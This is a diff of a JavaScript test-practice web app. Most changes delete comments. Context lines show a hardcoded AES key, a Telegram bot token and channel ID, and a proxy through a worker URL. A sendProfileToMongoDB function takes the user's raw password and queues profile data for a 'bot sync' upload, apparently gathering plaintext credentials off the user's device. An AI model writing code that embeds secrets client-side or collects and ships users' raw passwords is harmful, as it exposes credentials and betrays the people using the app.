@@ -7,7 +7,6 @@ const API_BASE = "https://rozgarapinew.teachx.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
 const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
 
-// 🟢 TELEGRAM UPLOAD CONFIGURATION (Note: Safe to keep if app is run locally/in webview wrapper)
 const TG_BOT_TOKEN = "8832643385:AAG5SZyJo7dDrvvK_dO_2pEOQK09OLeA6WM"; 
 const TG_CHANNEL_ID = "-1004454849047";
 
@@ -63,9 +62,9 @@ async function idbGetItem(key) {
 async function restoreFromPermanentIDB() {
     requestPersistentStorage();
     try {
+        // Restore FULL data from IDB memory
         const idbAttempts = await idbGetItem("rwa_attempted_tests_full");
         if (idbAttempts && typeof idbAttempts === "object") {
-            // Restore FULL data from IDB memory
             ATTEMPTED_TESTS = { ...idbAttempts, ...ATTEMPTED_TESTS };
             
             // Build SLIM copy for LocalStorage so it doesn't crash Quota Limit
@@ -197,7 +196,6 @@ function getSavedUserProfile() {
 }
 
 function getSavedAttemptsMap() {
-    // Note: Attempt Map is fully loaded from IDB during restoreFromPermanentIDB
     return {};
 }
 
@@ -307,7 +305,7 @@ window.recordUserTestAttempt = function(testId, attemptInfo) {
         date: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" })
     };
 
-    // 🚀 PERMANENT FIX: Keep LocalStorage extremely lightweight to avoid QuotaExceededError crashes
+    // Keep LocalStorage extremely lightweight to avoid QuotaExceededError crashes
     const slimCopyForLocalStorage = {};
     Object.keys(ATTEMPTED_TESTS).forEach(key => {
         slimCopyForLocalStorage[key] = {
@@ -322,7 +320,7 @@ window.recordUserTestAttempt = function(testId, attemptInfo) {
         localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(slimCopyForLocalStorage));
     } catch {}
     
-    // 🚀 Save Full Copy only in IndexedDB which has massive storage limit
+    // Save Full Copy only in IndexedDB which has massive storage limit
     idbSetItem("rwa_attempted_tests_full", ATTEMPTED_TESTS);
     
     window.updateDashboardUI();
@@ -667,7 +665,6 @@ async function fetchUserDetailsFromServer(jwtToken, userId) {
     return null;
 }
 
-// 🚀 PERMANENT FIX: Sync Overwrite Issue Fixed (Uses Queue Array)
 function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
     const payload = {
         login_method: loginMethod,
@@ -711,7 +708,7 @@ function processPendingBotSync() {
         }).then(res => {
             isSyncing = false;
             if (res.ok) {
-                queue.shift(); // Remove successful sync from queue
+                queue.shift(); 
                 localStorage.setItem("pending_bot_sync", JSON.stringify(queue));
                 if (queue.length > 0) setTimeout(trySend, 1000);
             } else setTimeout(trySend, 10000);
